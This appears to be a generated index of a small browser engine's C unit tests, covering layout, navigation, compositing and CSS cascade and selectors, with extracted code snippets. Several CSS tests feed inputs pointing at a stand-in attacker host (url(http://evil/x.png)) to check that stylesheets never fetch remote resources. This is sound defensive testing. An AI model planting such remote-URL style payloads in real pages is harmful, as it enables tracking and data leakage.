- `test_hr` (line 82) `static void test_hr(void **state)`
- `test_inline_and_inline_block` (line 89) `static void test_inline_and_inline_block(void **state)`
- `test_display_none_for_non_rendered` (line 100) `static void test_display_none_for_non_rendered(void **state)`
- `test_case_insensitive` (line 109) `static void test_case_insensitive(void **state)`
- `test_unknown_and_null_are_neutral_inline` (line 117) `static void test_unknown_and_null_are_neutral_inline(void **state)`
- `test_div_is_block` (line 132) `static void test_div_is_block(void **state)`
- `test_parse_display_keywords` (line 139) `static void test_parse_display_keywords(void **state)`
- `test_parse_display_inline_aliases` (line 158) `static void test_parse_display_inline_aliases(void **state)`
- `test_parse_display_case_and_trim` (line 167) `static void test_parse_display_case_and_trim(void **state)`
- `test_parse_display_errors` (line 176) `static void test_parse_display_errors(void **state)`
- `test_display_name` (line 194) `static void test_display_name(void **state)`
- `test_place_no_box_is_identity` (line 209) `static void test_place_no_box_is_identity(void **state)` - *static void test_display_name(void **state) { (void)state; assert_string_equal(bx_display_name(BX_DISPLAY_BLOCK), "block"); assert_string_equal(bx_display_name(BX_DISPLAY_INLINE), "inline"); assert_string_equal(bx_display_name(BX_DISPLAY_INLINE_BLOCK), "inline-block"); assert_string_equal(bx_display_name(BX_DISPLAY_LIST_ITEM), "list-item"); assert_string_equal(bx_display_name(BX_DISPLAY_FLEX), "flex"); assert_string_equal(bx_display_name(BX_DISPLAY_GRID), "grid"); assert_string_equal(bx_display_name(BX_DISPLAY_NONE), "none"); /* unknown enum value falls back to inline, never NULL assert_string_equal(bx_display_name((bx_display)999), "inline"); } /* --- bx_place: author box horizontal geometry (Hito 23b-3) ---*
- `test_place_max_width_caps` (line 216) `static void test_place_max_width_caps(void **state)`
- `test_place_centering` (line 227) `static void test_place_centering(void **state)`
- `test_place_insets` (line 239) `static void test_place_insets(void **state)`
- `test_place_failclosed_bounds` (line 251) `static void test_place_failclosed_bounds(void **state)`
- `main` (line 295) `int main(void)`

#### `test_box_tree.c`
**Path:** `tests/test_box_tree.c`

**Functions:**
- `assert_rect` (line 26) `static void assert_rect(const bt_node *n, double x, double y, double w, double h)`
- `test_null_root` (line 33) `static void test_null_root(void **state)`
- `test_leaf` (line 38) `static void test_leaf(void **state)`
- `test_leaf_with_padding` (line 45) `static void test_leaf_with_padding(void **state)`
- `test_block_stacking_with_collapse` (line 60) `static void test_block_stacking_with_collapse(void **state)`
- `test_flex_row_grow` (line 73) `static void test_flex_row_grow(void **state)`
- `test_flex_gap_and_justify_center` (line 91) `static void test_flex_gap_and_justify_center(void **state)`
- `test_flex_wrap_two_lines` (line 107) `static void test_flex_wrap_two_lines(void **state)`
- `test_flex_nowrap_default_single_line_unchanged` (line 129) `static void test_flex_nowrap_default_single_line_unchanged(void **state)`
- `test_flex_wrap_reverse_two_lines` (line 149) `static void test_flex_wrap_reverse_two_lines(void **state)`
- `test_flex_wrap_row_gap_distinct_from_gap` (line 171) `static void test_flex_wrap_row_gap_distinct_from_gap(void **state)`
- `test_flex_cross_axis_align` (line 191) `static void test_flex_cross_axis_align(void **state)`
- `test_grid_row_gap_distinct_from_gap` (line 209) `static void test_grid_row_gap_distinct_from_gap(void **state)`
- `test_grid_without_row_gap_falls_back_to_gap` (line 232) `static void test_grid_without_row_gap_falls_back_to_gap(void **state)`
- `test_grid` (line 248) `static void test_grid(void **state)`
- `test_grid_weighted_tracks` (line 269) `static void test_grid_weighted_tracks(void **state)`
- `test_grid_column_span` (line 287) `static void test_grid_column_span(void **state)`
- `test_nested_flex_in_block` (line 307) `static void test_nested_flex_in_block(void **state)`
- `test_display_none_skipped` (line 331) `static void test_display_none_skipped(void **state)`
- `test_grid_bad_columns` (line 346) `static void test_grid_bad_columns(void **state)`
- `test_flex_negative_gap` (line 356) `static void test_flex_negative_gap(void **state)`
- `test_children_cap` (line 366) `static void test_children_cap(void **state)`
- `test_depth_cap` (line 376) `static void test_depth_cap(void **state)`
- `test_positioning_null_args` (line 393) `static void test_positioning_null_args(void **state)` - *static bt_node chain[BT_MAX_DEPTH + 5]; size_t n = sizeof chain / sizeof chain[0]; for (size_t i = 0; i < n; ++i) { chain[i].display = BX_DISPLAY_BLOCK; chain[i].content_h = 1; if (i + 1 < n) { chain[i].children = &chain[i + 1]; chain[i].child_count = 1; } } assert_int_equal(bt_layout(&chain[0], 200), BT_ERR_RANGE); } /* --- Stage 2: position + z-index (red until bt_resolve_positioning exists) ---*
- `test_positioning_static_unchanged` (line 407) `static void test_positioning_static_unchanged(void **state)`
- `test_positioning_relative_offset` (line 419) `static void test_positioning_relative_offset(void **state)`
- `test_positioning_absolute_against_ancestor` (line 440) `static void test_positioning_absolute_against_ancestor(void **state)`
- `test_positioning_absolute_against_viewport` (line 463) `static void test_positioning_absolute_against_viewport(void **state)`
- `test_positioning_fixed_against_viewport` (line 480) `static void test_positioning_fixed_against_viewport(void **state)`
- `test_positioning_sticky_treated_as_relative` (line 499) `static void test_positioning_sticky_treated_as_relative(void **state)`
- `test_positioning_stacking_order` (line 517) `static void test_positioning_stacking_order(void **state)`
- `test_positioning_doc_order_tiebreak` (line 537) `static void test_positioning_doc_order_tiebreak(void **state)`
- `test_positioning_no_insets` (line 555) `static void test_positioning_no_insets(void **state)`
- `test_positioning_null_geometry` (line 572) `static void test_positioning_null_geometry(void **state)`
- `test_positioning_nbox_cap` (line 589) `static void test_positioning_nbox_cap(void **state)`
- `main` (line 606) `int main(void)`

#### `test_browser.c`
**Path:** `tests/test_browser.c`

**Functions:**
- `test_init` (line 19) `static void test_init(void **state)` - *include "browser.h"*
- `test_navigate_history` (line 30) `static void test_navigate_history(void **state)`
- `test_navigate_from_middle_discards_future` (line 60) `static void test_navigate_from_middle_discards_future(void **state)`
- `test_back_forward_bounds` (line 78) `static void test_back_forward_bounds(void **state)`
- `test_rejects_invalid_url` (line 94) `static void test_rejects_invalid_url(void **state)`
- `test_accepts_https_and_file` (line 107) `static void test_accepts_https_and_file(void **state)`
- `test_url_bar_editing` (line 121) `static void test_url_bar_editing(void **state)`
- `test_url_bar_selection` (line 152) `static void test_url_bar_selection(void **state)` - *Omnibar selection model: extend builds a selection, ops replace/delete it, and a * plain move collapses it.*
- `test_set_page` (line 195) `static void test_set_page(void **state)`
- `test_set_page_sanitizes_invalid_utf8` (line 218) `static void test_set_page_sanitizes_invalid_utf8(void **state)` - *Page title/text come from hostile documents; legacy encodings (Latin-1) carry bytes that are invalid UTF-8 and poison the cairo text renderer. browser_set_page * must store well-formed UTF-8, substituting '?' for any invalid byte.*
- `test_exceptions` (line 251) `static void test_exceptions(void **state)`
- `test_status_toast` (line 277) `static void test_status_toast(void **state)` - *The transient status line (toast) is time-bounded and caller-clocked: visible until now_ms reaches the expiry, then gone. NULL/empty clears it, and any real * navigation drops a stale toast.*
- `test_status_truncates` (line 308) `static void test_status_truncates(void **state)`
- `main` (line 325) `int main(void)`

**Macros:**
- `_POSIX_C_SOURCE` (line 7)

#### `test_compositor.c`
**Path:** `tests/test_compositor.c`

**Functions:**
- `test_sc_opacity` (line 25) `static void test_sc_opacity(void **state)` - *Build a cx_style with sane defaults (static, opaque, no blend, in-flow block), * then override the fields a test cares about. static cx_style base_style(void) { cx_style s = { .position = CSS_POS_STATIC, .z_index = 0, .z_auto = 1, .opacity = -1, .mix_blend = 0, .isolation = 0, .is_float = 0, .is_inline = 0, .has_transform = 0 }; return s; } /* --- cx_forms_stacking_context ---*
- `test_sc_mix_blend` (line 34) `static void test_sc_mix_blend(void **state)`
- `test_sc_isolation` (line 42) `static void test_sc_isolation(void **state)`
- `test_sc_transform` (line 50) `static void test_sc_transform(void **state)`
- `test_sc_positioned_z` (line 57) `static void test_sc_positioned_z(void **state)`
- `test_sc_fixed_sticky_always` (line 69) `static void test_sc_fixed_sticky_always(void **state)`
- `test_sc_static_none` (line 76) `static void test_sc_static_none(void **state)`
- `test_layer_negative_z` (line 85) `static void test_layer_negative_z(void **state)` - *(void)state; cx_style s = base_style(); s.position = CSS_POS_FIXED;  assert_int_equal(cx_forms_stacking_context(&s), 1); s.position = CSS_POS_STICKY; assert_int_equal(cx_forms_stacking_context(&s), 1); } static void test_sc_static_none(void **state) { (void)state; cx_style s = base_style(); assert_int_equal(cx_forms_stacking_context(&s), 0); assert_int_equal(cx_forms_stacking_context(NULL), 0); /* NULL-safe } /* --- cx_box_layer ---*
- `test_layer_positive_z` (line 92) `static void test_layer_positive_z(void **state)`
- `test_layer_zero_z_context` (line 99) `static void test_layer_zero_z_context(void **state)`
- `test_layer_zero_z_positioned_auto` (line 108) `static void test_layer_zero_z_positioned_auto(void **state)`
- `test_layer_float` (line 115) `static void test_layer_float(void **state)`
- `test_layer_inline_and_block` (line 122) `static void test_layer_inline_and_block(void **state)`
- `mk` (line 132) `static cx_item mk(cx_layer layer, int z, int z_auto, size_t doc, size_t ref)` - *cx_style s = base_style(); s.is_float = 1; assert_int_equal(cx_box_layer(&s), CX_LAYER_FLOAT); } static void test_layer_inline_and_block(void **state) { (void)state; cx_style s = base_style(); s.is_inline = 1; assert_int_equal(cx_box_layer(&s), CX_LAYER_INLINE); s = base_style(); assert_int_equal(cx_box_layer(&s), CX_LAYER_BLOCK); assert_int_equal(cx_box_layer(NULL), CX_LAYER_BLOCK); /* NULL-safe default } /* --- cx_item_compare ---*
- `test_compare_layer_then_z_then_doc` (line 138) `static void test_compare_layer_then_z_then_doc(void **state)`
- `test_sort_full_paint_order` (line 159) `static void test_sort_full_paint_order(void **state)` - *cx_item c = mk(CX_LAYER_POS_Z, 1, 0, 5, 0); cx_item d = mk(CX_LAYER_POS_Z, 9, 0, 1, 0); assert_true(cx_item_compare(&c, &d) < 0);           /* same layer -> z asc cx_item e = mk(CX_LAYER_ZERO_Z, 0, 0, 3, 0); cx_item f = mk(CX_LAYER_ZERO_Z, 0, 1, 8, 0);        /* auto == 0 -> tie on z assert_true(cx_item_compare(&e, &f) < 0);           /* doc order breaks the tie cx_item g = mk(CX_LAYER_BLOCK, 0, 1, 2, 0); assert_int_equal(cx_item_compare(&g, &g), 0);       /* reflexive } /* --- cx_sort ---*
- `test_sort_z_within_layer` (line 176) `static void test_sort_z_within_layer(void **state)`
- `test_sort_stability` (line 192) `static void test_sort_stability(void **state)`
- `test_sort_noop_guards` (line 206) `static void test_sort_noop_guards(void **state)`
- `test_sort_matches_zindex_only_ordering` (line 218) `static void test_sort_matches_zindex_only_ordering(void **state)` - *The positioned subset the painter already orders by z-index (all in CX_LAYER_ZERO_Z or NEG_Z/POS_Z) sorts identically through cx_sort, so wiring it later changes no * pixels where no new stacking context appears.*
- `main` (line 230) `int main(void)`

#### `test_css.c`
**Path:** `tests/test_css.c`

**Functions:**
- `test_inline_text_align` (line 31) `static void test_inline_text_align(void **state)`
- `test_inline_font_size` (line 39) `static void test_inline_font_size(void **state)`
- `test_inline_line_height` (line 49) `static void test_inline_line_height(void **state)`
- `test_inline_font_weight_style` (line 64) `static void test_inline_font_weight_style(void **state)`
- `test_inline_text_decoration` (line 76) `static void test_inline_text_decoration(void **state)`
- `test_font_family` (line 103) `static void test_font_family(void **state)` - */* none is an explicit value (0), distinct from unset (-1). assert_int_equal(css_parse_inline("text-decoration:none", 0).text_decoration, 0); /* Combined keywords OR together; CSS3 style/color/thickness tokens are ignored. assert_int_equal(css_parse_inline("text-decoration:underline overline", 0).text_decoration, CSS_DECO_UNDERLINE | CSS_DECO_OVERLINE); assert_int_equal(css_parse_inline("text-decoration:underline wavy red 2px", 0).text_decoration, CSS_DECO_UNDERLINE); /* A value with no line keyword at all (only a color) is dropped -> unset. assert_int_equal(css_parse_inline("text-decoration:red", 0).text_decoration, -1); /* An unrelated property leaves it unset. assert_int_equal(css_parse_inline("color:red", 0).text_decoration, -1); } /* --- text-presentation extensions (Hito 23b-6) ---*
- `test_text_transform` (line 124) `static void test_text_transform(void **state)`
- `test_letter_word_spacing` (line 138) `static void test_letter_word_spacing(void **state)`
- `test_text_shadow` (line 153) `static void test_text_shadow(void **state)`
- `test_opacity` (line 175) `static void test_opacity(void **state)`
- `test_vertical_align` (line 185) `static void test_vertical_align(void **state)`
- `test_text_indent` (line 194) `static void test_text_indent(void **state)`
- `test_white_space` (line 203) `static void test_white_space(void **state)`
- `test_list_style_type` (line 214) `static void test_list_style_type(void **state)`
- `test_text_ext_cascade_and_important` (line 228) `static void test_text_ext_cascade_and_important(void **state)`
- `test_inline_display` (line 243) `static void test_inline_display(void **state)`
- `test_inline_container_props` (line 254) `static void test_inline_container_props(void **state)` - *assert_int_equal(s.font_family, CSS_FF_MONO);          /* inline wins css_free(sh); } static void test_inline_display(void **state) { (void)state; assert_int_equal(css_parse_inline("display:none", 0).display, CSS_DISP_NONE); assert_int_equal(css_parse_inline("display:flex", 0).display, CSS_DISP_FLEX); assert_int_equal(css_parse_inline("display:grid", 0).display, CSS_DISP_GRID); assert_int_equal(css_parse_inline("display:block", 0).display, CSS_DISP_BLOCK); assert_int_equal(css_parse_inline("color:red", 0).display, CSS_DISP_UNSET); } /* --- flex/grid container props (Hito 23b-2) ---*
- `test_sheet_container_props` (line 282) `static void test_sheet_container_props(void **state)`
- `test_container_cascade_inline_wins` (line 303) `static void test_container_cascade_inline_wins(void **state)` - *const char *row[] = { "row" }; css_style f = css_resolve(sh, "div", NULL, row, 1, NULL, 0); assert_int_equal(f.display, CSS_DISP_FLEX); assert_int_equal(f.gap, 16); assert_int_equal(f.justify, CSS_JUSTIFY_SPACE_BETWEEN); css_style g = css_resolve(sh, "section", "g", NULL, 0, NULL, 0); assert_int_equal(g.display, CSS_DISP_GRID); assert_int_equal(g.grid_cols, 4); css_free(sh); } /* The container props go through the full cascade: inline beats the sheet.*
- `test_container_fail_closed_and_bounds` (line 318) `static void test_container_fail_closed_and_bounds(void **state)` - *Fail closed: a bad justify keyword is dropped (unset); grid-template-columns:none * is unset; gap and column count are clamped to their anti-DoS bounds.*
- `test_grid_repeat_expands_count` (line 375) `static void test_grid_repeat_expands_count(void **state)`
- `test_grid_minmax_counts_as_one_track` (line 386) `static void test_grid_minmax_counts_as_one_track(void **state)`
- `test_grid_repeat_autofill_fails_closed` (line 394) `static void test_grid_repeat_autofill_fails_closed(void **state)`
- `test_grid_repeat_malformed_fails_closed` (line 405) `static void test_grid_repeat_malformed_fails_closed(void **state)`
- `test_grid_repeat_clamped_anti_dos` (line 412) `static void test_grid_repeat_clamped_anti_dos(void **state)`
- `test_container_unset` (line 419) `static void test_container_unset(void **state)`
- `test_url_value_dropped` (line 429) `static void test_url_value_dropped(void **state)` - *assert_int_equal( css_parse_inline("grid-template-columns: repeat(999, 1fr)", 0).grid_cols, (int)CSS_GRID_COLS_MAX); } static void test_container_unset(void **state) { (void)state; css_style s = css_parse_inline("color:red", 0); assert_int_equal(s.gap, -1); assert_int_equal(s.justify, CSS_JUSTIFY_UNSET); assert_int_equal(s.grid_cols, 0); } /* --- security: never phone home, ignore junk ---*
- `test_unknown_props_ignored` (line 439) `static void test_unknown_props_ignored(void **state)`
- `test_linear_gradient_basic` (line 448) `static void test_linear_gradient_basic(void **state)` - */* A bare url() with no colour still yields -1. assert_int_equal(css_parse_inline("background: url(http://evil/x.png)", 0).background, -1); /* A plain color background is fine. assert_int_equal(css_parse_inline("background:#112233", 0).background, 0x112233); } static void test_unknown_props_ignored(void **state) { (void)state; css_style s = css_parse_inline("position:absolute; z-index:9; color:#abcdef; --x:1", 0); assert_int_equal(s.color, 0xabcdef); assert_int_equal(s.text_align, CSS_ALIGN_UNSET); } /* --- linear-gradient backgrounds (2026-07-11) ---*
- `test_linear_gradient_directions` (line 459) `static void test_linear_gradient_directions(void **state)`
- `test_linear_gradient_stops` (line 478) `static void test_linear_gradient_stops(void **state)`
- `test_linear_gradient_fail_closed` (line 496) `static void test_linear_gradient_fail_closed(void **state)`
- `test_background_shorthand_resets_gradient` (line 517) `static void test_background_shorthand_resets_gradient(void **state)`
- `test_malformed_inline_no_crash` (line 536) `static void test_malformed_inline_no_crash(void **state)`
- `test_custom_prop_var_basic` (line 544) `static void test_custom_prop_var_basic(void **state)` - */* and a higher-specificity gradient CLEARS a lower-tier color css_style b = css_resolve(sh, "div", "grad", NULL, 0, NULL, 0); assert_int_equal(b.bg_grad_n, 2); assert_int_equal(b.background, -1); css_free(sh); } static void test_malformed_inline_no_crash(void **state) { (void)state; css_style s = css_parse_inline(";;: ; color ; :red; color::; color:#777;;", 0); assert_int_equal(s.color, 0x777777); } /* --- custom properties (--name) + var() ---*
- `test_custom_prop_var_fallback_used_when_missing` (line 555) `static void test_custom_prop_var_fallback_used_when_missing(void **state)`
- `test_custom_prop_var_no_fallback_drops_decl` (line 561) `static void test_custom_prop_var_no_fallback_drops_decl(void **state)`
- `test_custom_prop_var_chain` (line 570) `static void test_custom_prop_var_chain(void **state)`
- `test_custom_prop_var_self_reference_fails_closed` (line 578) `static void test_custom_prop_var_self_reference_fails_closed(void **state)`
- `test_custom_prop_var_in_shorthand` (line 587) `static void test_custom_prop_var_in_shorthand(void **state)`
- `test_custom_prop_var_later_declaration_wins` (line 597) `static void test_custom_prop_var_later_declaration_wins(void **state)`
- `test_custom_prop_var_unbalanced_paren_drops` (line 610) `static void test_custom_prop_var_unbalanced_paren_drops(void **state)`
- `test_custom_prop_var_never_phones_home` (line 617) `static void test_custom_prop_var_never_phones_home(void **state)`
- `test_sheet_type_selector` (line 631) `static void test_sheet_type_selector(void **state)` - *A custom property whose value contains url() — colour IS honoured, * the URL is never fetched. css_style s = css_parse_inline( "--evil: url(http://evil/x.png) #112233; background: var(--evil)", 0); assert_int_equal(s.background, 0x112233); /* A var() resolved to bare url() with no colour still yields -1. s = css_parse_inline("--bg: url(http://evil/x.png); background: var(--bg)", 0); assert_int_equal(s.background, -1); } /* --- <style> block parsing + selectors ---*
- `test_sheet_class_and_id` (line 642) `static void test_sheet_class_and_id(void **state)`
- `test_sheet_universal_and_group` (line 652) `static void test_sheet_universal_and_group(void **state)`
- `test_sheet_compound_selector` (line 662) `static void test_sheet_compound_selector(void **state)`
- `el_node` (line 676) `static css_element el_node(const char *tag, const char *id,
                           const char...` - *static void test_sheet_compound_selector(void **state) { (void)state; css_sheet *sh = NULL; assert_int_equal(css_parse("a.button { color:#0a0b0c }", 0, &sh), CSS_OK); const char *btn[] = { "button" }; const char *other[] = { "link" }; assert_int_equal(css_resolve(sh, "a", NULL, btn, 1, NULL, 0).color, 0x0a0b0c); assert_int_equal(css_resolve(sh, "a", NULL, other, 1, NULL, 0).color, -1);  /* class mismatch assert_int_equal(css_resolve(sh, "p", NULL, btn, 1, NULL, 0).color, -1);    /* tag mismatch css_free(sh); } /* Builds one css_element node aliasing the given fields (test-local helper).*
- `el_sib_node` (line 687) `static css_element el_sib_node(const char *tag, int nth, int nsib,
                              ...` - *} /* Builds one css_element node aliasing the given fields (test-local helper). static css_element el_node(const char *tag, const char *id, const char *const *classes, size_t nc, const css_element *parent) { css_element e; e.tag = tag; e.id = id; e.classes = classes; e.nclasses = nc; e.attrs = NULL; e.nattrs = 0; e.parent = parent; e.nth = 0; e.nsib = 0; e.prev = NULL;   /* sibling context unknown by default return e; } /* Like el_node but with the sibling context (nth/nsib/prev) populated.*
- `el_attr_node` (line 695) `static css_element el_attr_node(const char *tag, const char *id,
                                ...` - *e.attrs = NULL; e.nattrs = 0; e.parent = parent; e.nth = 0; e.nsib = 0; e.prev = NULL;   /* sibling context unknown by default return e; } /* Like el_node but with the sibling context (nth/nsib/prev) populated. static css_element el_sib_node(const char *tag, int nth, int nsib, const css_element *prev, const css_element *parent) { css_element e = el_node(tag, NULL, NULL, 0, parent); e.nth = nth; e.nsib = nsib; e.prev = prev; return e; } /* Like el_node but also carries an attribute list (for [attr] selectors).*
- `test_text_decoration_cascade` (line 703) `static void test_text_decoration_cascade(void **state)`
- `test_descendant_combinator` (line 722) `static void test_descendant_combinator(void **state)`
- `test_child_combinator` (line 738) `static void test_child_combinator(void **state)`
- `test_combinator_specificity_sum` (line 751) `static void test_combinator_specificity_sum(void **state)`
- `test_combinator_class_chain` (line 766) `static void test_combinator_class_chain(void **state)`
- `test_adjacent_sibling_combinator` (line 785) `static void test_adjacent_sibling_combinator(void **state)` - *const char *nav[] = { "nav" }; const char *item[] = { "item" }; css_element navdiv = el_node("div", NULL, nav, 1, NULL); css_element li     = el_node("li", NULL, item, 1, &navdiv); css_element a      = el_node("a", NULL, NULL, 0, &li); assert_int_equal(css_resolve_el(sh, &a, NULL, 0).color, 0x0a0a0a); /* Missing the .nav ancestor -> no match (fail closed). css_element li2 = el_node("li", NULL, item, 1, NULL); css_element a2  = el_node("a", NULL, NULL, 0, &li2); assert_int_equal(css_resolve_el(sh, &a2, NULL, 0).color, -1); css_free(sh); } /* --- sibling combinators + pseudo-classes (Hito 23b-9) ---*
- `test_general_sibling_combinator` (line 800) `static void test_general_sibling_combinator(void **state)`
- `test_sibling_mixed_with_child` (line 815) `static void test_sibling_mixed_with_child(void **state)`
- `test_pseudo_link` (line 832) `static void test_pseudo_link(void **state)`
- `test_pseudo_never_match_keeps_group` (line 850) `static void test_pseudo_never_match_keeps_group(void **state)`
- `test_pseudo_structural` (line 869) `static void test_pseudo_structural(void **state)`
- `test_pseudo_nth_child` (line 889) `static void test_pseudo_nth_child(void **state)`
- `assert_int_equal` (line 893) `assert_int_equal(css_parse("tr:nth-child(even)`
- `test_pseudo_nth_last_child` (line 912) `static void test_pseudo_nth_last_child(void **state)`
- `assert_int_equal` (line 916) `assert_int_equal(css_parse("li:nth-last-child(2)`
- `test_pseudo_root_and_form_state` (line 923) `static void test_pseudo_root_and_form_state(void **state)`
- `test_pseudo_unknown_drops_selector` (line 947) `static void test_pseudo_unknown_drops_selector(void **state)`
- `test_pseudo_specificity` (line 969) `static void test_pseudo_specificity(void **state)`
- `test_pseudo_with_sibling_combinator` (line 987) `static void test_pseudo_with_sibling_combinator(void **state)`
- `test_pseudo_nth_malformed_drops` (line 1004) `static void test_pseudo_nth_malformed_drops(void **state)`
- `assert_int_equal` (line 1010) `assert_int_equal(css_parse("li:nth-child()` - *Malformed or oversized An+B drops the selector (fail closed); partner rules * survive.*
- `test_resolve_el_inline_only` (line 1020) `static void test_resolve_el_inline_only(void **state)`
- `test_attr_presence` (line 1028) `static void test_attr_presence(void **state)` - *"li{background:#101010}", 0, &sh), CSS_OK); css_element li = el_sib_node("li", 1, 1, NULL, NULL); assert_int_equal(css_resolve_el(sh, &li, NULL, 0).color, -1); assert_int_equal(css_resolve_el(sh, &li, NULL, 0).background, 0x101010); css_free(sh); } static void test_resolve_el_inline_only(void **state) { (void)state; /* el == NULL resolves just the inline declarations (no crash, no match). assert_int_equal(css_resolve_el(NULL, NULL, "color:#abcdef", 0).color, 0xabcdef); } /* --- attribute selectors (Hito 23b-4) ---*
- `test_attr_equals` (line 1041) `static void test_attr_equals(void **state)`
- `test_attr_operators` (line 1059) `static void test_attr_operators(void **state)`
- `test_attr_case_insensitive_flag` (line 1091) `static void test_attr_case_insensitive_flag(void **state)`
- `test_attr_name_case_insensitive` (line 1106) `static void test_attr_name_case_insensitive(void **state)`
- `test_attr_quoted_value_with_space` (line 1117) `static void test_attr_quoted_value_with_space(void **state)`
- `test_attr_specificity_and_compound` (line 1131) `static void test_attr_specificity_and_compound(void **state)`
- `test_attr_in_combinator` (line 1148) `static void test_attr_in_combinator(void **state)`
- `test_attr_malformed_fail_closed` (line 1164) `static void test_attr_malformed_fail_closed(void **state)`
- `test_important_inline_not_dropped` (line 1182) `static void test_important_inline_not_dropped(void **state)` - *Unbalanced/empty/unknown-operator brackets drop only that selector; the plain * rule in the group survives. assert_int_equal(css_parse("input[ {color:#111111}"     /* unbalanced "input[]{color:#222222}"      /* empty "p{color:#333333}", 0, &sh), CSS_OK); css_element p = el_node("p", NULL, NULL, 0, NULL); assert_int_equal(css_resolve_el(sh, &p, NULL, 0).color, 0x333333); css_attr none[] = { { "type", "x" } }; css_element in = el_attr_node("input", NULL, NULL, 0, none, 1, NULL); assert_int_equal(css_resolve_el(sh, &in, NULL, 0).color, -1); css_free(sh); } /* --- !important (Hito 23b-4) ---*
- `test_important_beats_specificity` (line 1192) `static void test_important_beats_specificity(void **state)`
- `test_important_tier_then_normal_order` (line 1201) `static void test_important_tier_then_normal_order(void **state)`
- `test_important_inline_beats_sheet_important` (line 1211) `static void test_important_inline_beats_sheet_important(void **state)`
- `test_important_in_shorthand` (line 1223) `static void test_important_in_shorthand(void **state)`
- `test_cascade_specificity` (line 1240) `static void test_cascade_specificity(void **state)` - */* !important stamps every side a shorthand expands to. css_style s = css_parse_inline("margin:10px !important", 0); assert_int_equal(s.margin_top, 10); assert_int_equal(s.margin_left, 10); css_sheet *sh = NULL; assert_int_equal(css_parse("p{margin:4px} p{margin:9px !important}", 0, &sh), CSS_OK); /* The important shorthand wins over a later non-important one too. css_style r = css_resolve(sh, "p", NULL, NULL, 0, NULL, 0); assert_int_equal(r.margin_top, 9); assert_int_equal(r.margin_right, 9); css_free(sh); } /* --- cascade ---*
- `silent` (line 1257) `* silent (anti-DoS truncation, not a parse failure). 500 filler rules is well past
 * the OLD cap...`
- `test_cascade_document_order` (line 1286) `static void test_cascade_document_order(void **state)`
- `test_cascade_inline_wins` (line 1295) `static void test_cascade_inline_wins(void **state)`
- `test_at_rules_skipped` (line 1304) `static void test_at_rules_skipped(void **state)`
- `test_media_screen_and_print` (line 1322) `static void test_media_screen_and_print(void **state)` - *@import is skipped entirely (no network). @media screen matches the default context, so its rule applies, then the later same-specificity plain rule wins * by document order. assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, 0x123456); css_free(sh); } /* --- @media (Hito 23b) --- /* @media screen matches the default context; its rules apply. @media print does not.*
- `test_media_prefers_color_scheme` (line 1341) `static void test_media_prefers_color_scheme(void **state)` - *"@media print { p { color:#010101 } }", 0, &sh), CSS_OK); assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, 0xabcdef); css_free(sh); /* With a print context, the print block applies and the screen block does not. css_media print_ctx = { 0, 1, CSS_MEDIA_DEFAULT_WIDTH }; assert_int_equal(css_parse_media( "@media screen { p { color:#abcdef } }\n" "@media print { p { color:#010101 } }", 0, &print_ctx, &sh), CSS_OK); assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, 0x010101); css_free(sh); } /* prefers-color-scheme: dark applies only when the context prefers dark.*
- `test_media_width_queries` (line 1357) `static void test_media_width_queries(void **state)` - *const char *css = "@media (prefers-color-scheme: dark) { body { color:#ffffff } }"; css_sheet *sh = NULL; assert_int_equal(css_parse(css, 0, &sh), CSS_OK); /* default = light assert_int_equal(css_resolve(sh, "body", NULL, NULL, 0, NULL, 0).color, -1); css_free(sh); css_media dark = { 1, 0, CSS_MEDIA_DEFAULT_WIDTH }; assert_int_equal(css_parse_media(css, 0, &dark, &sh), CSS_OK); assert_int_equal(css_resolve(sh, "body", NULL, NULL, 0, NULL, 0).color, 0xffffff); css_free(sh); } /* min-width / max-width compare against the normalized 1920px width.*
- `assert_int_equal` (line 1360) `assert_int_equal(css_parse(
        "@media (min-width: 600px)`
- `test_media_and_or` (line 1372) `static void test_media_and_or(void **state)` - *(void)state; css_sheet *sh = NULL; assert_int_equal(css_parse( "@media (min-width: 600px) { p { color:#111111 } }\n" "@media (min-width: 3000px) { p { color:#222222 } }\n" "@media (max-width: 1000px) { div { color:#333333 } }", 0, &sh), CSS_OK); /* 1920 >= 600 applies; 1920 >= 3000 does not; so p stays #111111. assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, 0x111111); /* 1920 <= 1000 is false, so the div rule never applies. assert_int_equal(css_resolve(sh, "div", NULL, NULL, 0, NULL, 0).color, -1); css_free(sh); } /* "and" requires every part; a comma is OR across the query list.*
- `assert_int_equal` (line 1375) `assert_int_equal(css_parse(
        "@media screen and (min-width: 600px)`
- `test_media_unknown_fails_closed` (line 1386) `static void test_media_unknown_fails_closed(void **state)` - *static void test_media_and_or(void **state) { (void)state; css_sheet *sh = NULL; assert_int_equal(css_parse( "@media screen and (min-width: 600px) { p { color:#0a0a0a } }\n" "@media screen and (min-width: 5000px) { div { color:#0b0b0b } }\n" "@media print, screen { span { color:#0c0c0c } }", 0, &sh), CSS_OK); assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, 0x0a0a0a); assert_int_equal(css_resolve(sh, "div", NULL, NULL, 0, NULL, 0).color, -1); /* and fails assert_int_equal(css_resolve(sh, "span", NULL, NULL, 0, NULL, 0).color, 0x0c0c0c); /* or: screen css_free(sh); } /* Fail closed: unknown media type/feature and `not` never apply their rules.*
- `assert_int_equal` (line 1389) `assert_int_equal(css_parse(
        "@media (hover: hover)`
- `test_parse_null_args` (line 1403) `static void test_parse_null_args(void **state)` - *assert_int_equal(css_parse( "@media (hover: hover) { p { color:#cccccc } }\n" "@media tv { a { color:#dddddd } }\n" "@media not screen { b { color:#eeeeee } }\n" "h1 { color:#0f0f0f }", 0, &sh), CSS_OK); assert_int_equal(css_resolve(sh, "p", NULL, NULL, 0, NULL, 0).color, -1); assert_int_equal(css_resolve(sh, "a", NULL, NULL, 0, NULL, 0).color, -1); assert_int_equal(css_resolve(sh, "b", NULL, NULL, 0, NULL, 0).color, -1); /* a normal rule after the dropped @media blocks still parses. assert_int_equal(css_resolve(sh, "h1", NULL, NULL, 0, NULL, 0).color, 0x0f0f0f); css_free(sh); } /* --- arg handling ---*
- `test_resolve_null_safe` (line 1413) `static void test_resolve_null_safe(void **state)`
